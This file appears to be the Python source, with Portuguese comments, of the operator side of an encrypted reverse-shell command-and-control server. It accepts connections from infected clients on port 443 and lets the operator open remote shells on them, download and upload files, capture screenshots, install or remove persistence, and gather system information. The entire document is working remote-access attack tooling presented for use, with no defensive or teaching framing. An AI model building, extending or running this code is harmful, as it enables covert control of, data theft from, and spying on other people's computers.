#!/usr/bin/env python3
import socket
import json
import base64
import os
import threading
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import queue
import readline  # Para histórico de comandos

class ReverseShellServer:
    def __init__(self, host='0.0.0.0', port=443):
        # Configurações de rede
        self.host = host
        self.port = port
        
        # Configurações de criptografia (devem corresponder ao cliente)
        self.key = hashlib.sha256(b'32_character_long_secret_key_here!!').digest()
        self.iv = b'16_bytes_iv_here!'
        
        # Gerenciamento de sessões
        self.sessions = {}
        self.current_session = None
        self.command_history = []
        
        # Fila para saída assíncrona
        self.output_queue = queue.Queue()
        
    def encrypt(self, data):
        """Criptografa dados com AES-CBC"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded_data = pad(json.dumps(data).encode(), AES.block_size)
        return base64.b64encode(cipher.encrypt(padded_data))

    def decrypt(self, encrypted_data):
        """Descriptografa dados com AES-CBC"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
        return json.loads(unpad(decrypted, AES.block_size).decode())

    def start_server(self):
        """Inicia o servidor para escutar conexões"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        
        print(f"[*] Servidor escutando em {self.host}:{self.port}")
        
        # Thread para aceitar conexões
        threading.Thread(target=self.accept_connections, daemon=True).start()
        
        # Thread para interface de comando
        threading.Thread(target=self.command_interface, daemon=True).start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Encerrando servidor...")
            self.server.close()

    def accept_connections(self):
        """Aceita novas conexões de clientes"""
        while True:
            try:
                client_socket, addr = self.server.accept()
                
                # Thread para lidar com a sessão
                threading.Thread(
                    target=self.handle_session,
                    args=(client_socket, addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                print(f"[!] Erro ao aceitar conexão: {e}")
                break

    def handle_session(self, client_socket, addr):
        """Manipula uma sessão de cliente"""
        try:
            # Recebe handshake inicial
            data = client_socket.recv(4096)
            if not data:
                return
                
            handshake = self.decrypt(data)
            
            if handshake.get('type') != 'handshake':
                return
                
            session_id = handshake['session_id']
            self.sessions[session_id] = {
                'socket': client_socket,
                'address': addr,
                'info': {
                    'platform': handshake['platform'],
                    'user': handshake['user'],
                    'hostname': handshake['hostname'],
                    'pid': handshake['pid']
                },
                'active': True
            }
            
            print(f"\n[+] Nova sessão: {session_id} de {addr[0]}:{addr[1]}")
            print(f"    Plataforma: {handshake['platform']}")
            print(f"    Usuário: {handshake['user']}")
            print(f"    Hostname: {handshake['hostname']}")
            print(f"    PID: {handshake['pid']}")
            
            # Se for a única sessão, seleciona automaticamente
            if len(self.sessions) == 1:
                self.current_session = session_id
                print("[*] Sessão selecionada automaticamente")
            
            # Mantém a conexão ativa
            while self.sessions[session_id]['active']:
                try:
                    data = client_socket.recv(65536)
                    if not data:
                        break
                        
                    decrypted = self.decrypt(data)
                    self.output_queue.put((session_id, decrypted))
                    
                except Exception as e:
                    print(f"[!] Erro na sessão {session_id}: {e}")
                    break
                    
        except Exception as e:
            print(f"[!] Erro ao manipular sessão: {e}")
        finally:
            if session_id in self.sessions:
                self.sessions[session_id]['active'] = False
                client_socket.close()
                print(f"[-] Sessão {session_id} encerrada")

    def send_command(self, session_id, command_type, data=''):
        """Envia um comando para uma sessão"""
        if session_id not in self.sessions or not self.sessions[session_id]['active']:
            print("[!] Sessão não está ativa")
            return False
            
        try:
            command = {
                'type': command_type,
                'data': data
            }
            encrypted = self.encrypt(command)
            self.sessions[session_id]['socket'].sendall(encrypted + b'\n')
            return True
        except Exception as e:
            print(f"[!] Erro ao enviar comando: {e}")
            return False

    def download_file(self, remote_path, local_path=None):
        """Baixa um arquivo do cliente"""
        if not self.current_session:
            print("[!] Nenhuma sessão selecionada")
            return
            
        if not local_path:
            local_path = os.path.basename(remote_path)
            
        print(f"[*] Solicitando download de {remote_path}...")
        if not self.send_command(self.current_session, 'special', f'download {remote_path}'):
            return
            
        # Aguarda resposta
        response = self.wait_for_response()
        if not response or response.get('status') != 'success':
            print("[!] Falha no download:", response.get('message', 'Resposta inválida'))
            return
            
        # Salva o arquivo localmente
        try:
            content = base64.b64decode(response['content'])
            with open(local_path, 'wb') as f:
                f.write(content)
                
            print(f"[+] Arquivo salvo como {local_path} ({len(content)} bytes)")
        except Exception as e:
            print(f"[!] Erro ao salvar arquivo: {e}")

    def upload_file(self, local_path, remote_path):
        """Envia um arquivo para o cliente"""
        if not self.current_session:
            print("[!] Nenhuma sessão selecionada")
            return
            
        if not os.path.exists(local_path):
            print("[!] Arquivo local não encontrado")
            return
            
        try:
            with open(local_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode()
                
            print(f"[*] Enviando {local_path} para {remote_path}...")
            self.send_command(
                self.current_session, 
                'special', 
                f'upload {remote_path} {content}'
            )
            
            # Aguarda confirmação
            response = self.wait_for_response()
            if response and response.get('status') == 'success':
                print("[+] Upload concluído com sucesso")
            else:
                print("[!] Falha no upload:", response.get('message', 'Resposta inválida'))
                
        except Exception as e:
            print(f"[!] Erro durante upload: {e}")

    def take_screenshot(self):
        """Solicita uma captura de tela do cliente"""
        if not self.current_session:
            print("[!] Nenhuma sessão selecionada")
            return
            
        print("[*] Solicitando captura de tela...")
        self.send_command(self.current_session, 'special', 'screenshot')
        
        response = self.wait_for_response()
        if not response or response.get('status') != 'success':
            print("[!] Falha ao obter captura:", response.get('message', 'Resposta inválida'))
            return
            
        # Salva a imagem
        try:
            content = base64.b64decode(response['content'])
            filename = f"screenshot_{self.current_session}_{int(time.time())}.png"
            with open(filename, 'wb') as f:
                f.write(content)
                
            print(f"[+] Captura salva como {filename} ({len(content)} bytes)")
        except Exception as e:
            print(f"[!] Erro ao salvar captura: {e}")

    def interactive_shell(self):
        """Inicia um shell interativo"""
        if not self.current_session:
            print("[!] Nenhuma sessão selecionada")
            return
            
        print("[*] Iniciando shell interativo (digite 'exit' para sair)")
        self.send_command(self.current_session, 'special', 'shell')
        
        while True:
            try:
                cmd = input("shell> ")
                if not cmd:
                    continue
                    
                if cmd.lower() in ['exit', 'quit']:
                    self.send_command(self.current_session, 'command', 'exit')
                    break
                    
                self.send_command(self.current_session, 'command', cmd)
                response = self.wait_for_response()
                
                if not response:
                    print("[!] Conexão perdida")
                    break
                    
                print(response.get('data', ''))
                
            except KeyboardInterrupt:
                print("\n[*] Saindo do shell interativo")
                self.send_command(self.current_session, 'command', 'exit')
                break
            except Exception as e:
                print(f"[!] Erro no shell: {e}")
                break

    def wait_for_response(self, timeout=30):
        """Aguarda por uma resposta da sessão atual"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                session_id, response = self.output_queue.get_nowait()
                if session_id == self.current_session:
                    return response
            except queue.Empty:
                time.sleep(0.1)
                
        return None

    def show_help(self):
        """Mostra ajuda dos comandos"""
        print("""
        Comandos do servidor:
          sessions            - Lista sessões ativas
          interact <id>       - Interage com uma sessão específica
          shell               - Inicia shell interativo
          download <rem> [loc] - Baixa arquivo do alvo
          upload <loc> <rem>  - Envia arquivo para o alvo
          screenshot          - Tira captura de tela do alvo
          persist             - Instala persistência no alvo
          cleanup             - Remove persistência do alvo
          info                - Mostra informações do sistema alvo
          background          - Coloca sessão em segundo plano
          exit                - Encerra servidor
          help                - Mostra esta ajuda
        """)

    def command_interface(self):
        """Interface de comando para o servidor"""
        time.sleep(1)  # Dar tempo para o cabeçalho aparecer
        
        while True:
            try:
                # Mostra prompt com sessão atual
                if self.current_session:
                    prompt = f"session({self.current_session})> "
                else:
                    prompt = "server> "
                    
                cmd = input(prompt).strip().lower()
                if not cmd:
                    continue
                    
                # Adiciona ao histórico
                self.command_history.append(cmd)
                
                if cmd == 'sessions':
                    print("\nSessões ativas:")
                    for session_id, session in self.sessions.items():
                        status = "ATIVA" if session['active'] else "INATIVA"
                        print(f"  {session_id}: {session['address'][0]} - {session['info']['hostname']} ({status})")
                        
                elif cmd.startswith('interact '):
                    session_id = cmd.split(' ', 1)[1]
                    if session_id in self.sessions:
                        self.current_session = session_id
                        print(f"[*] Interagindo com sessão {session_id}")
                    else:
                        print("[!] Sessão não encontrada")
                        
                elif cmd == 'shell':
                    self.interactive_shell()
                    
                elif cmd.startswith('download '):
                    parts = cmd.split(' ', 2)
                    if len(parts) >= 2:
                        remote = parts[1]
                        local = parts[2] if len(parts) > 2 else None
                        self.download_file(remote, local)
                    else:
                        print("[!] Uso: download <remote_path> [local_path]")
                        
                elif cmd.startswith('upload '):
                    parts = cmd.split(' ', 2)
                    if len(parts) == 3:
                        self.upload_file(parts[1], parts[2])
                    else:
                        print("[!] Uso: upload <local_path> <remote_path>")
                        
                elif cmd == 'screenshot':
                    self.take_screenshot()
                    
                elif cmd == 'persist':
                    if not self.current_session:
                        print("[!] Nenhuma sessão selecionada")
                        continue
                        
                    print("[*] Instalando persistência...")
                    self.send_command(self.current_session, 'special', 'persist')
                    response = self.wait_for_response()
                    print(response.get('message', 'Resposta inválida'))
                    
                elif cmd == 'cleanup':
                    if not self.current_session:
                        print("[!] Nenhuma sessão selecionada")
                        continue
                        
                    print("[*] Removendo persistência...")
                    self.send_command(self.current_session, 'special', 'cleanup')
                    response = self.wait_for_response()
                    print(response.get('message', 'Resposta inválida'))
                    
                elif cmd == 'info':
                    if not self.current_session:
                        print("[!] Nenhuma sessão selecionada")
                        continue
                        
                    print("[*] Solicitando informações do sistema...")
                    self.send_command(self.current_session, 'special', 'info')
                    response = self.wait_for_response()
                    
                    if response and response.get('status') == 'success':
                        info = response.get('info', {})
                        for key, value in info.items():
                            print(f"\n=== {key.upper()} ===")
                            print(value)
                    else:
                        print("[!] Falha ao obter informações:", response.get('message', 'Resposta inválida'))
                        
                elif cmd == 'background':
                    self.current_session = None
                    print("[*] Sessão colocada em segundo plano")
                    
                elif cmd in ['exit', 'quit']:
                    print("[*] Encerrando todas as sessões...")
                    for session_id in list(self.sessions.keys()):
                        self.send_command(session_id, 'special', 'exit')
                    return
                    
                elif cmd == 'help':
                    self.show_help()
                    
                else:
                    print("[!] Comando não reconhecido. Digite 'help' para ajuda.")
                    
            except KeyboardInterrupt:
                print("\n[*] Retornando ao prompt (digite 'exit' para sair)")
                continue
            except Exception as e:
                print(f"[!] Erro no comando: {e}")

if __name__ == "__main__":
    server = ReverseShellServer()
    server.start_server()
